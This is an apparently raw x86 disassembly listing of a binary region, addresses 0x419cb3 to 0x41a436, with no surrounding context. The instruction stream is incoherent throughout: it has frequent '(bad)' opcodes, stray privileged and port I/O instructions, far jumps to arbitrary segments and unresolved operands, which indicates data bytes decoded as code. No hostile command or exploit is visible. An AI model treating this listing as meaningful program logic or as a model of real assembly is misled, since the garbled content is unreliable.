  419cb3:	ret    0xa5ef
  419cb6:	lods   eax,DWORD PTR ds:[esi]
  419cb7:	ins    BYTE PTR es:[edi],dx
  419cb8:	icebp  
  419cb9:	mov    ebp,0x8010d8f4
  419cbe:	xor    al,0xa4
  419cc0:	sti    
  419cc1:	imul   BYTE PTR [ebx]
  419cc3:	mov    ch,0x11
  419cc5:	enter  0xa8ed,0xb9
  419cc9:	and    BYTE PTR [edi+edx*1],ch
  419ccc:	mov    DWORD PTR [esp+edx*4-0x18],eax
  419cd0:	aaa    
  419cd1:	shr    BYTE PTR [ebx],0xd2
  419cd4:	clc    
  419cd5:	push   esi
  419cd6:	stos   BYTE PTR es:[edi],al
  419cd7:	pop    edx
  419cd8:	ret    0xfeae
  419cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cdc:	adc    BYTE PTR [ecx-0x755a7995],bl
  419ce2:	mov    bh,0x61
  419ce4:	test   al,0x53
  419ce6:	jo     0x419d2f
  419ce8:	(bad)  
  419ce9:	gs or  al,0xeb
  419cec:	xor    DWORD PTR [eax-0x67f29b1d],ecx
  419cf2:	mov    ebx,ss
  419cf4:	lahf   
  419cf5:	adc    al,0x26
  419cf7:	std    
  419cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cf9:	or     eax,0xe2bf28c6
  419cfe:	repz jmp 0xd76d:0xbf9f08ae
  419d06:	(bad)  
  419d07:	fiadd  DWORD PTR [eax+0x4d20dfbb]
  419d0d:	lahf   
  419d0e:	stos   BYTE PTR es:[edi],al
  419d0f:	mov    ebx,0x52a3b637
  419d14:	jae    0x419d28
  419d16:	mov    ch,0xc8
  419d18:	in     eax,dx
  419d19:	ret    
  419d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d1b:	(bad)
  419d1f:	push   0x24
  419d21:	dec    ecx
  419d22:	cmp    eax,0xc2810a88
  419d27:	fidiv  WORD PTR ss:[esp+edi*2+0x1c]
  419d2c:	arpl   WORD PTR [edx],cx
  419d2e:	test   BYTE PTR [esi+0xfd10ffa],0x37
  419d35:	mov    ch,0x12
  419d37:	repz cmp BYTE PTR ds:0xae504c9f,ch
  419d3e:	nop
  419d3f:	icebp  
  419d40:	mov    ebx,0x1e151c68
  419d45:	cs jbe 0x419dbe
  419d48:	mov    edi,0xfb544a4f
  419d4d:	push   ecx
  419d4e:	aas    
  419d4f:	xchg   esi,eax
  419d50:	fsubr  QWORD PTR [ecx-0x5c]
  419d53:	jl     0x419d37
  419d55:	paddw  mm5,QWORD PTR [ebp-0x79]
  419d59:	jg     0x419d6f
  419d5b:	pop    edi
  419d5c:	mov    esp,DWORD PTR [ebx-0x5d]
  419d5f:	dec    ebx
  419d60:	pushf  
  419d61:	pop    ecx
  419d62:	aaa    
  419d63:	out    dx,al
  419d64:	xor    al,0x76
  419d66:	das    
  419d67:	jne    0x419daa
  419d69:	add    DWORD PTR [eax+0x198d1633],ebx
  419d6f:	xor    edx,DWORD PTR [ebp-0x2635cd0e]
  419d75:	test   al,0xae
  419d77:	mov    dl,0xff
  419d79:	cmp    DWORD PTR [esp+edx*1+0x3a],edi
  419d7d:	inc    edi
  419d7e:	dec    edi
  419d7f:	push   esi
  419d80:	mov    esp,0x9bcec219
  419d85:	pop    es
  419d86:	jle    0x419d58
  419d88:	test   al,0x2a
  419d8a:	xchg   esp,eax
  419d8b:	push   0xa433cc72
  419d90:	out    dx,al
  419d91:	iret   
  419d92:	xchg   edx,eax
  419d93:	pop    edi
  419d94:	nop
  419d95:	jb     0x419d90
  419d97:	or     dh,0xf0
  419d9a:	dec    BYTE PTR [ebp+0x325e9366]
  419da0:	loope  0x419db1
  419da2:	std    
  419da3:	jnp    0x419dd7
  419da5:	out    0xff,eax
  419da7:	jo     0x419e0d
  419da9:	daa    
  419daa:	(bad)  
  419dab:	fwait
  419dac:	push   ss
  419dad:	icebp  
  419dae:	xchg   esi,eax
  419daf:	sbb    eax,0x77905560
  419db4:	ins    BYTE PTR es:[edi],dx
  419db5:	jge    0x419d88
  419db7:	push   ds
  419db8:	push   edi
  419db9:	loope  0x419d41
  419dbb:	xor    ebx,ebp
  419dbd:	cmp    ebx,DWORD PTR [esi+0x18]
  419dc0:	mov    ds:0xf3b2e866,eax
  419dc5:	inc    esp
  419dc6:	popf   
  419dc7:	sbb    eax,0xf23ea279
  419dcc:	mov    ds:0xbf222334,eax
  419dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd2:	cmp    al,BYTE PTR [esi]
  419dd4:	leave  
  419dd5:	sbb    ebp,ebp
  419dd7:	aas    
  419dd8:	mov    esi,0xd2adb96a
  419ddd:	arpl   WORD PTR [esi+0x52],di
  419de0:	xor    al,0x80
  419de2:	push   edi
  419de3:	push   eax
  419de4:	hlt    
  419de5:	xchg   edi,eax
  419de6:	adc    BYTE PTR [edx-0x250d5990],al
  419dec:	ficomp WORD PTR [edx-0x27]
  419def:	aaa    
  419df0:	sti    
  419df1:	and    BYTE PTR [esi+0x8],cl
  419df4:	sub    eax,0x37921734
  419df9:	mov    eax,0xe8dfd88b
  419dfe:	or     edx,ecx
  419e00:	xchg   ebp,eax
  419e01:	push   edi
  419e02:	aam    0xcd
  419e04:	add    eax,0x92e2fd21
  419e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e0a:	out    0xb7,al
  419e0c:	iret   
  419e0d:	mov    ah,0xa0
  419e0f:	pop    esp
  419e10:	fld    TBYTE PTR [eax-0xa]
  419e13:	out    0xdd,eax
  419e15:	mov    ebp,0x512606ac
  419e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e1b:	jbe    0x419e5e
  419e1d:	dec    edx
  419e1e:	mov    eax,0xb3364d5
  419e23:	test   eax,0x31fdc29d
  419e28:	cmp    al,0x6c
  419e2a:	call   0xfdd7:0xf4d3fe3b
  419e31:	rcr    BYTE PTR [ecx-0x6c818f04],1
  419e37:	mov    ds:0x60966ded,eax
  419e3c:	jmp    0x96b5647a
  419e41:	xchg   DWORD PTR [ecx],edi
  419e43:	adc    ch,BYTE PTR [esi+0x7]
  419e46:	jo     0x419e75
  419e48:	fnstenv [ebx+0x65a2f30]
  419e4e:	popa   
  419e4f:	adc    dh,BYTE PTR [ecx-0x2665209a]
  419e55:	stos   BYTE PTR es:[edi],al
  419e56:	dec    esp
  419e57:	jl     0x419e25
  419e59:	int3   
  419e5a:	out    dx,eax
  419e5b:	lahf   
  419e5c:	in     al,dx
  419e5d:	xor    eax,edi
  419e5f:	test   BYTE PTR [ebx],ch
  419e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e62:	test   eax,0x2601e8b7
  419e67:	in     al,dx
  419e68:	loopne 0x419e78
  419e6a:	sub    ebp,DWORD PTR [ebx+0x40]
  419e6d:	sbb    eax,0x4d97d71d
  419e72:	and    DWORD PTR [edi-0x65],edi
  419e75:	jmp    0x37356830
  419e7a:	jge    0x419e1b
  419e7c:	dec    esp
  419e7d:	dec    ebp
  419e7e:	sbb    eax,0xb42e96a0
  419e83:	pop    ebp
  419e84:	fs dec esp
  419e86:	mov    al,0x7a
  419e88:	or     esp,DWORD PTR [ebx]
  419e8a:	adc    ah,BYTE PTR [ebx+0x9]
  419e8d:	mov    dh,0x15
  419e8f:	mov    ebx,0xc78d5f2c
  419e94:	sub    al,ch
  419e96:	loope  0x419e3e
  419e98:	adc    eax,0x671a6d5c
  419e9d:	adc    eax,0xf255ab77
  419ea2:	jbe    0x419ed5
  419ea4:	dec    esp
  419ea5:	xlat   BYTE PTR ds:[ebx]
  419ea6:	neg    BYTE PTR [ecx]
  419ea8:	adc    al,0x26
  419eaa:	ret    0x462b
  419ead:	dec    esi
  419eae:	add    BYTE PTR [edx-0x478de2c4],al
  419eb4:	xlat   BYTE PTR ds:[ebx]
  419eb5:	mov    dh,0x8a
  419eb7:	cmp    esp,DWORD PTR [ecx+0x57]
  419eba:	cld    
  419ebb:	call   0x65c2:0xbf494c5f
  419ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ec3:	mov    ecx,0xa5f8e87
  419ec8:	pop    ss
  419ec9:	loope  0x419f2b
  419ecb:	sbb    eax,DWORD PTR [eax]
  419ecd:	mov    ecx,0x205a1807
  419ed2:	sub    DWORD PTR [edx+0x49],ebp
  419ed5:	cmp    al,0xc6
  419ed7:	add    al,BYTE PTR [ebx]
  419ed9:	out    0x38,eax
  419edb:	pop    edx
  419edc:	sub    eax,edx
  419ede:	and    edi,eax
  419ee0:	repnz dec esi
  419ee2:	cwde   
  419ee3:	add    al,0xe3
  419ee5:	lock inc ebp
  419ee7:	add    BYTE PTR [ebx+eiz*2+0x54],dl
  419eeb:	stos   BYTE PTR es:[edi],al
  419eec:	dec    esi
  419eed:	jmp    0x419f21
  419eef:	mov    eax,0xaaebe2ca
  419ef4:	push   ss
  419ef5:	xchg   esi,eax
  419ef6:	xchg   BYTE PTR [ecx-0x13],ch
  419ef9:	and    al,0x6d
  419efb:	test   eax,0x187dfbba
  419f00:	mov    BYTE PTR [ecx+0x28fb9278],ah
  419f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f07:	push   ebx
  419f08:	fs push ss
  419f0a:	out    0x3,al
  419f0c:	lock mov eax,ds:0x51d428df
  419f12:	push   0x6f
  419f14:	rcl    BYTE PTR ss:[edx+0x3a55298e],1
  419f1b:	(bad)  
  419f1c:	cmp    ch,bl
  419f1e:	jecxz  0x419f83
  419f20:	pop    ebx
  419f21:	fild   DWORD PTR [edi-0x2c]
  419f24:	xor    BYTE PTR [esi],bl
  419f26:	jle    0x419f85
  419f28:	jg     0x419f4d
  419f2a:	jg     0x419fa3
  419f2c:	jg     0x419f92
  419f2e:	mov    ecx,0x68fb0fc9
  419f33:	cli    
  419f34:	mov    ebx,0x6b298798
  419f39:	push   ecx
  419f3a:	test   DWORD PTR [ebx],edi
  419f3c:	xor    cl,ch
  419f3e:	addr16 dec eax
  419f40:	jae    0x419f08
  419f42:	add    al,al
  419f44:	int3   
  419f45:	rol    BYTE PTR [edx+eax*4+0x2ddfe271],1
  419f4c:	cmp    DWORD PTR [esi],eax
  419f4e:	neg    DWORD PTR [eax]
  419f50:	mul    DWORD PTR [edx+0x3422e15c]
  419f56:	bound  ecx,QWORD PTR [edx-0x18]
  419f59:	jmp    0x8577ab1
  419f5e:	ins    BYTE PTR es:[edi],dx
  419f5f:	test   DWORD PTR [edx],eax
  419f61:	sub    dh,dh
  419f63:	add    ebx,DWORD PTR ds:[edx-0x3209b16d]
  419f6a:	fs jno 0x419f35
  419f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f6e:	mov    ah,0xf9
  419f70:	add    ah,BYTE PTR [edi+0x7a]
  419f73:	xor    al,0x3
  419f75:	push   0xecceb2cb
  419f7a:	jbe    0x419f50
  419f7c:	sub    BYTE PTR [ecx+0x2c],dl
  419f7f:	add    ah,BYTE PTR [ebp+0x35d93830]
  419f85:	cmp    al,0x4d
  419f87:	push   edi
  419f88:	mov    al,0x82
  419f8a:	mov    ah,BYTE PTR [ecx+0x3b1647cc]
  419f90:	or     DWORD PTR [ecx+0x11e72935],0x90ea72ca
  419f9a:	sbb    dh,BYTE PTR [edi]
  419f9c:	dec    edx
  419f9d:	inc    ebp
  419f9e:	imul   esi,DWORD PTR [edx+0x69],0x34af5fb2
  419fa5:	and    DWORD PTR [ebp-0x1e],ebp
  419fa8:	jae    0x419fa0
  419faa:	stc    
  419fab:	scas   eax,DWORD PTR es:[edi]
  419fac:	fwait
  419fad:	add    BYTE PTR [esi],al
  419faf:	popf   
  419fb0:	and    BYTE PTR [ebp-0x5f4f9059],0xab
  419fb7:	dec    ecx
  419fb8:	push   0x35
  419fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fbb:	sbb    BYTE PTR [esi],cl
  419fbd:	stos   DWORD PTR es:[edi],eax
  419fbe:	lea    edx,[esi+0x18]
  419fc1:	test   al,0xba
  419fc3:	pushf  
  419fc4:	or     DWORD PTR [edi+0x73],0xffffffd9
  419fc8:	add    DWORD PTR [ebx],0xffffffd2
  419fcb:	rcr    BYTE PTR [edx],0x45
  419fce:	xor    al,0xc6
  419fd0:	loopne 0x419f52
  419fd2:	int3   
  419fd3:	push   ecx
  419fd4:	loop   0x41a03d
  419fd6:	cmp    eax,0xa26d98a
  419fdb:	mov    ds,WORD PTR [ebx+ebx*1-0x2295f498]
  419fe2:	loop   0x41a033
  419fe4:	ins    DWORD PTR es:[edi],dx
  419fe5:	stc    
  419fe6:	clc    
  419fe7:	shr    eax,0x3f
  419fea:	ja     0x41a03c
  419fec:	and    bl,BYTE PTR [esi+ebp*4+0x1a]
  419ff0:	shr    BYTE PTR [ebp-0x3fc34e14],0x6
  419ff7:	fwait
  419ff8:	inc    edx
  419ff9:	lea    edx,[ebp-0x1bc71dc9]
  419fff:	dec    edi
  41a000:	sub    eax,DWORD PTR [edi+0x31]
  41a003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a004:	popf   
  41a005:	fs into 
  41a007:	cmp    edi,esi
  41a009:	mov    ebx,0x841fb79b
  41a00e:	mov    edi,0xa1b45a9a
  41a013:	and    BYTE PTR [edx],bh
  41a015:	cldemote BYTE PTR [ebp-0x5e]
  41a019:	dec    ebp
  41a01a:	dec    esp
  41a01b:	jae    0x419fe5
  41a01d:	sbb    dh,BYTE PTR [eax+0x3d191c8]
  41a023:	jl     0x419fd3
  41a025:	dec    ebx
  41a026:	inc    edx
  41a027:	mov    eax,0x5dde761c
  41a02c:	dec    ebx
  41a02d:	push   ecx
  41a02e:	inc    esi
  41a02f:	mov    WORD PTR [edi+0x13a22c19],gs
  41a035:	les    esp,FWORD PTR [eax+0x2f034f7d]
  41a03b:	into   
  41a03c:	test   eax,0x7f103942
  41a041:	mov    ah,0x57
  41a043:	pop    ebp
  41a044:	int3   
  41a045:	and    DWORD PTR [esi+edi*2+0x5d],ebp
  41a049:	test   DWORD PTR [edx-0x5b],0x50bce0a4
  41a050:	cwde   
  41a051:	or     ebp,DWORD PTR [ecx]
  41a053:	adc    al,0xa6
  41a055:	scas   al,BYTE PTR es:[edi]
  41a056:	jne    0x41a043
  41a058:	fmul   DWORD PTR [ecx+0x27]
  41a05b:	push   0xf82da28
  41a060:	adc    esi,DWORD PTR [eax+0x38]
  41a063:	or     BYTE PTR [ecx+0x67857549],ah
  41a069:	jp     0x41a060
  41a06b:	into   
  41a06c:	xchg   edx,eax
  41a06d:	mov    ecx,0xd6fe3344
  41a072:	jbe    0x41a006
  41a074:	or     ah,BYTE PTR [eax-0x65b43703]
  41a07a:	sbb    ecx,DWORD PTR [ebp+0x5a]
  41a07d:	cwde   
  41a07e:	ror    BYTE PTR [esi+0x12855db9],1
  41a084:	cmp    ch,bl
  41a086:	mov    ?,esp
  41a088:	push   ss
  41a089:	imul   esi,DWORD PTR [edi],0x41
  41a08c:	sbb    dh,cl
  41a08e:	aad    0xe1
  41a090:	outs   dx,BYTE PTR ds:[esi]
  41a091:	xor    bh,BYTE PTR [eax-0x78fa7b8f]
  41a097:	nop
  41a098:	(bad)  
  41a09a:	cmp    al,0x17
  41a09c:	test   al,0xa3
  41a09e:	pop    esi
  41a09f:	and    esi,esi
  41a0a1:	adc    ch,BYTE PTR [ecx-0xa8e7ada]
  41a0a7:	push   edi
  41a0a8:	lock sub DWORD PTR [ebp-0x29],esp
  41a0ac:	in     al,dx
  41a0ad:	push   es
  41a0ae:	mov    ebx,0xfdf1878e
  41a0b3:	jns    0x41a0d7
  41a0b5:	cld    
  41a0b6:	xor    al,BYTE PTR [edx]
  41a0b8:	pop    edx
  41a0b9:	add    BYTE PTR [ebx],0xe2
  41a0bc:	xor    DWORD PTR [edi],ebx
  41a0be:	sub    cl,BYTE PTR [eax-0x55888e1]
  41a0c4:	stos   BYTE PTR es:[edi],al
  41a0c5:	adc    bl,ch
  41a0c7:	outs   dx,DWORD PTR ds:[esi]
  41a0c8:	inc    esp
  41a0c9:	cmp    BYTE PTR [ecx+0x7f1d702d],al
  41a0cf:	repz cmp DWORD PTR [esi-0x66],ebx
  41a0d3:	fcmovb st,st(7)
  41a0d5:	and    DWORD PTR [edx+ebp*2-0x29],eax
  41a0d9:	imul   esp,esp,0x3b
  41a0dc:	adc    al,0x5c
  41a0de:	lods   al,BYTE PTR ds:[esi]
  41a0df:	and    eax,0x53d4ef46
  41a0e4:	wbinvd 
  41a0e6:	daa    
  41a0e7:	shr    DWORD PTR [edi],0x8e
  41a0ea:	fadd   DWORD PTR ds:0xd440199
  41a0f0:	fldenv [edi+0x22]
  41a0f3:	cmp    BYTE PTR [eax],cl
  41a0f5:	dec    ebx
  41a0f6:	dec    ebx
  41a0f7:	push   cs
  41a0f8:	std    
  41a0f9:	call   0x55f6:0xbb19575f
  41a100:	(bad)  
  41a101:	pop    ebp
  41a102:	les    edi,FWORD PTR [eax-0x7c]
  41a105:	test   eax,ebx
  41a107:	dec    esp
  41a108:	jmp    0x41a13f
  41a10a:	lods   eax,DWORD PTR fs:[esi]
  41a10c:	mov    al,bh
  41a10e:	(bad)
  41a111:	add    ecx,DWORD PTR [eax+0x2a]
  41a114:	cdq    
  41a115:	inc    DWORD PTR [ecx]
  41a117:	pop    eax
  41a118:	in     al,dx
  41a119:	dec    edi
  41a11a:	test   BYTE PTR [ecx],0xd
  41a11d:	push   edx
  41a11e:	retf   
  41a11f:	push   0xffffff92
  41a121:	clc    
  41a122:	dec    eax
  41a123:	leave  
  41a124:	fistp  WORD PTR [esi-0x36]
  41a127:	fstp   QWORD PTR [eax+0x562c5682]
  41a12d:	push   eax
  41a12e:	jnp    0x41a13c
  41a130:	imul   edx,DWORD PTR [ecx+0x5f],0xf8fe0b0a
  41a137:	ror    DWORD PTR [esi-0x2e],0x36
  41a13b:	inc    esi
  41a13c:	adc    eax,0x48cf0d45
  41a141:	loope  0x41a1a5
  41a143:	int    0x21
  41a145:	mov    bh,0x65
  41a147:	push   cs
  41a148:	or     BYTE PTR [ebx],dl
  41a14a:	out    0xb0,al
  41a14c:	ficomp DWORD PTR [eax]
  41a14e:	push   es
  41a14f:	(bad)  
  41a150:	aas    
  41a151:	sub    al,0xf9
  41a153:	mov    BYTE PTR [ebp+0x44],cl
  41a156:	push   ss
  41a157:	cwde   
  41a158:	push   0xf7e51e16
  41a15d:	adc    edi,DWORD PTR [edx]
  41a15f:	pop    ecx
  41a160:	mov    ds:0x66818a50,eax
  41a165:	test   al,0xe9
  41a167:	xor    BYTE PTR [esi+0x24],ch
  41a16a:	add    eax,0xa69e9706
  41a16f:	stos   DWORD PTR es:[edi],eax
  41a170:	mov    dl,0xb6
  41a172:	leave  
  41a173:	jns    0x41a137
  41a175:	inc    esp
  41a176:	mov    ds,WORD PTR [edx-0x50dc1fd]
  41a17c:	cdq    
  41a17d:	out    dx,eax
  41a17e:	xor    bh,BYTE PTR [ecx+0x44d33d7c]
  41a184:	gs xchg edx,eax
  41a186:	mov    edx,0x9ecad1ab
  41a18b:	jge    0x41a1f1
  41a18d:	fcomip st,st(2)
  41a18f:	add    eax,DWORD PTR [ecx]
  41a191:	or     cl,BYTE PTR [ecx-0x54]
  41a194:	sti    
  41a195:	sbb    al,0x69
  41a197:	jb     0x41a168
  41a199:	pop    esi
  41a19a:	dec    ebx
  41a19b:	mov    eax,ds:0x5bca622c
  41a1a0:	or     DWORD PTR [esi],ecx
  41a1a2:	xor    al,0x54
  41a1a4:	fnstenv [ebp+eax*2-0x67]
  41a1a8:	ret    0xbead
  41a1ab:	push   0x3566e9f6
  41a1b0:	sub    esp,edi
  41a1b2:	mov    ?,WORD PTR [ebx]
  41a1b4:	mov    bh,0x97
  41a1b6:	pop    edx
  41a1b7:	lods   al,BYTE PTR ds:[esi]
  41a1b8:	xor    bl,BYTE PTR [ebp-0x28]
  41a1bb:	mov    ds:0x4b7daa67,eax
  41a1c0:	(bad)  
  41a1c2:	sbb    dh,BYTE PTR ds:0xaeb958fb
  41a1c8:	out    0x2,eax
  41a1ca:	fpatan 
  41a1cc:	ret    
  41a1cd:	mov    dl,0x31
  41a1cf:	leave  
  41a1d0:	ss fwait
  41a1d2:	jae    0x41a24e
  41a1d4:	add    ebp,DWORD PTR [ebx+0xa]
  41a1d7:	das    
  41a1d8:	cdq    
  41a1d9:	or     BYTE PTR [edi],ch
  41a1db:	fcom   QWORD PTR [ecx-0x13c71c83]
  41a1e1:	mov    bl,dh
  41a1e3:	inc    ebx
  41a1e4:	into   
  41a1e5:	ret    
  41a1e6:	jb     0x41a1e3
  41a1e8:	sbb    edx,ebp
  41a1ea:	aaa    
  41a1eb:	xlat   BYTE PTR ds:[ebx]
  41a1ec:	pop    ebx
  41a1ee:	call   0x7be:0xfd3452e6
  41a1f5:	mov    edx,0x21c4ba35
  41a1fa:	sbb    ebp,DWORD PTR [eax+0x27143544]
  41a200:	clc    
  41a201:	adc    DWORD PTR [edi],edi
  41a203:	leave  
  41a204:	xchg   BYTE PTR [ebp+0x4e],bl
  41a207:	sbb    ebp,DWORD PTR [eax+0xe417e93]
  41a20d:	cmp    eax,0xa597e87d
  41a212:	aaa    
  41a213:	cmp    BYTE PTR [eax],al
  41a215:	jg     0x41a1a3
  41a217:	outs   dx,BYTE PTR ds:[esi]
  41a218:	mov    edx,0xca999914
  41a21d:	add    BYTE PTR [edx],ch
  41a21f:	(bad)  
  41a220:	(bad)  
  41a221:	nop
  41a222:	(bad)  
  41a224:	dec    ebx
  41a225:	mov    ch,0x35
  41a227:	adc    dl,ch
  41a229:	fcmovb st,st(1)
  41a22b:	push   esp
  41a22c:	std    
  41a22d:	outs   dx,DWORD PTR ds:[esi]
  41a22e:	adc    eax,0xf6c048e5
  41a233:	and    al,0x55
  41a235:	push   ebx
  41a236:	inc    ebx
  41a237:	pop    es
  41a238:	fisttp WORD PTR [edx]
  41a23a:	in     eax,dx
  41a23b:	jb     0x41a271
  41a23d:	mov    dh,0x63
  41a23f:	xor    bh,BYTE PTR [edi+0x67]
  41a242:	imul   ebp,DWORD PTR [edi+0x18],0x65
  41a246:	mov    esp,0x272b41c3
  41a24b:	hlt    
  41a24c:	fdivr  QWORD PTR [edi]
  41a24e:	into   
  41a24f:	mov    dh,0x4f
  41a251:	inc    ebp
  41a252:	jmp    0x402d395f
  41a257:	add    BYTE PTR [ebx+ebp*8-0x6f18842c],dl
  41a25e:	bound  esp,QWORD PTR [ecx+0x41]
  41a261:	fcom   QWORD PTR [ecx-0x32b0a37d]
  41a267:	dec    ecx
  41a268:	mov    edi,0x2b3bd97d
  41a26d:	test   BYTE PTR [ebx+0x78a748f],0x2c
  41a274:	mov    eax,0x5ffcb4e9
  41a279:	jo     0x41a23a
  41a27b:	mov    ds:0x9c4cca43,eax
  41a280:	mov    esi,0xcac2c8c1
  41a285:	cmp    BYTE PTR [ecx+0x3a],cl
  41a288:	add    eax,0x708bac73
  41a28d:	ins    BYTE PTR es:[edi],dx
  41a28e:	gs daa 
  41a290:	xchg   esp,eax
  41a291:	mov    BYTE PTR [ebx],ah
  41a293:	mov    eax,ds:0x2c86473d
  41a298:	xchg   eax,ebx
  41a29a:	inc    edi
  41a29b:	push   esp
  41a29c:	jmp    0x8e1c:0x1db4e9bc
  41a2a3:	fbstp  TBYTE PTR [ecx+0x1c6706e]
  41a2a9:	mov    ah,0x7f
  41a2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ac:	mov    eax,0x8e374cfc
  41a2b1:	je     0x41a2ad
  41a2b3:	shr    BYTE PTR [eax+0x21],0x7c
  41a2b7:	rol    DWORD PTR [ecx-0x4c],1
  41a2ba:	ret    0xdc06
  41a2bd:	jbe    0x41a284
  41a2bf:	js     0x41a242
  41a2c1:	out    dx,eax
  41a2c2:	aaa    
  41a2c3:	push   eax
  41a2c4:	inc    edx
  41a2c5:	aas    
  41a2c6:	ret    0x91a1
  41a2c9:	lds    ebp,FWORD PTR [ebx]
  41a2cb:	sar    DWORD PTR [esi+0x61],0xb9
  41a2cf:	pop    DWORD PTR [ebp+0x49]
  41a2d2:	add    al,0x8f
  41a2d4:	cmp    eax,DWORD PTR [ebp+0x4]
  41a2d7:	cwde   
  41a2d8:	push   eax
  41a2d9:	out    dx,al
  41a2da:	enter  0x8bce,0xd9
  41a2de:	loopne 0x41a278
  41a2e0:	cs or  eax,0x7e7703ea
  41a2e6:	push   esi
  41a2e7:	lods   eax,DWORD PTR ds:[esi]
  41a2e8:	and    DWORD PTR [edx],eax
  41a2ea:	or     al,0x1b
  41a2ec:	adc    DWORD PTR [ebx+0x65],esp
  41a2ef:	test   al,0xc8
  41a2f1:	mov    ch,0xca
  41a2f3:	jle    0x41a27c
  41a2f5:	and    eax,0x78df7a3f
  41a2fa:	test   BYTE PTR [ebx],cl
  41a2fc:	fst    QWORD PTR [ebx+0x6c0fe2f3]
  41a302:	inc    edi
  41a303:	mov    edx,0xe649c71c
  41a308:	sub    eax,0xc9cbfecf
  41a30d:	dec    ecx
  41a30e:	mov    ebp,0xaff2d7fa
  41a313:	leave  
  41a314:	jmp    0x83f5c2bb
  41a319:	xor    esp,DWORD PTR [eax-0xd]
  41a31c:	cmp    esi,DWORD PTR [ecx]
  41a31e:	leave  
  41a31f:	rol    DWORD PTR [edi],0x40
  41a322:	das    
  41a323:	sbb    al,0xd7
  41a325:	out    dx,al
  41a326:	test   al,0x9e
  41a328:	sub    dl,bl
  41a32a:	dec    eax
  41a32b:	fs pop ebx
  41a32d:	rcl    DWORD PTR [esi+0x152212a0],1
  41a333:	inc    ebp
  41a334:	and    eax,0x760f079
  41a339:	jae    0x41a2e0
  41a33b:	mov    dh,0xef
  41a33d:	fucomi st,st(1)
  41a33f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a340:	retf   
  41a341:	les    ecx,FWORD PTR [ecx]
  41a343:	jmp    0xdd0e68fe
  41a348:	rcl    BYTE PTR [ecx-0x5b6ccdef],cl
  41a34e:	cs jl  0x41a337
  41a351:	jl     0x41a2de
  41a353:	jo     0xca8c4f6a
  41a359:	jecxz  0x41a31a
  41a35b:	loopne 0x41a39e
  41a35d:	pop    ss
  41a35e:	adc    ebp,0x333ec44b
  41a364:	aad    0xa4
  41a366:	fsub   QWORD PTR [esp+ecx*4-0x4f]
  41a36a:	jae    0x41a3c2
  41a36c:	adc    esi,esp
  41a36e:	cmp    BYTE PTR ds:0x2431b552,ch
  41a374:	mov    al,0x4a
  41a376:	data16 jg 0x41a369
  41a379:	ret    0x891d
  41a37c:	in     al,0xdc
  41a37e:	dec    esi
  41a37f:	jne    0x41a37b
  41a381:	cld    
  41a382:	(bad)  [esi-0x660a3091]
  41a388:	push   es
  41a389:	jo     0x41a3e2
  41a38b:	cdq    
  41a38c:	sahf   
  41a38d:	add    BYTE PTR ds:0x684c7839,ah
  41a393:	loope  0x41a372
  41a395:	inc    edx
  41a396:	stos   DWORD PTR es:[edi],eax
  41a397:	pop    es
  41a398:	jmp    0x4c2b:0x377b3543
  41a39f:	mov    bh,0xcc
  41a3a1:	push   eax
  41a3a2:	sbb    edi,DWORD PTR [edx-0x55ed1f3d]
  41a3a8:	jmp    0x640be92b
  41a3ad:	push   esp
  41a3ae:	xchg   ebp,eax
  41a3af:	jae    0x41a392
  41a3b1:	inc    ebx
  41a3b2:	adc    BYTE PTR [ebx+0x3b2d934b],bh
  41a3b8:	xchg   esi,eax
  41a3b9:	xchg   esp,eax
  41a3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3bb:	mov    eax,0x8fab675f
  41a3c0:	inc    esp
  41a3c1:	js     0x41a374
  41a3c3:	sbb    BYTE PTR [eax],bh
  41a3c5:	sub    al,0x34
  41a3c7:	sar    DWORD PTR [ebx+ebp*8+0xf],1
  41a3cb:	idiv   DWORD PTR [ebx+0x7a3bffa3]
  41a3d1:	stos   DWORD PTR es:[edi],eax
  41a3d2:	je     0x41a3e1
  41a3d4:	dec    edi
  41a3d5:	fmul   st(7),st
  41a3d7:	nop
  41a3d8:	aad    0x7b
  41a3da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3db:	and    BYTE PTR [esi-0x3297e056],ch
  41a3e1:	rcr    DWORD PTR [edi],1
  41a3e3:	and    al,0x9c
  41a3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e6:	jle    0x41a383
  41a3e8:	cs jmp 0x41a42c
  41a3eb:	or     al,0x1d
  41a3ed:	call   0xa83499b2
  41a3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3f3:	enter  0xeb8c,0xa9
  41a3f7:	cwde   
  41a3f8:	aam    0x65
  41a3fa:	or     eax,0xd98f49a6
  41a3ff:	pop    esi
  41a400:	retf   
  41a401:	xor    dl,BYTE PTR [eax-0x424fecd9]
  41a407:	shl    DWORD PTR [eiz*2-0x25d18c1],1
  41a40e:	bound  edx,QWORD PTR [ebp+ecx*2-0x18]
  41a412:	fisubr DWORD PTR [ecx+0x1f4fc4f7]
  41a418:	fwait
  41a419:	pop    ss
  41a41a:	adc    al,0x50
  41a41c:	xchg   ebp,eax
  41a41d:	scas   eax,DWORD PTR es:[edi]
  41a41e:	pop    ds
  41a41f:	lods   eax,DWORD PTR ds:[esi]
  41a420:	js     0x41a496
  41a422:	jno    0x41a406
  41a424:	xchg   BYTE PTR [ecx+0x76],dh
  41a427:	inc    ebp
  41a428:	mov    DWORD PTR [edx+0xf],esi
  41a42b:	lock or eax,0x1b5551d1
  41a431:	out    dx,eax
  41a432:	jo     0x41a3c5
  41a434:	mov    dl,0x9a
  41a436:	push   ss
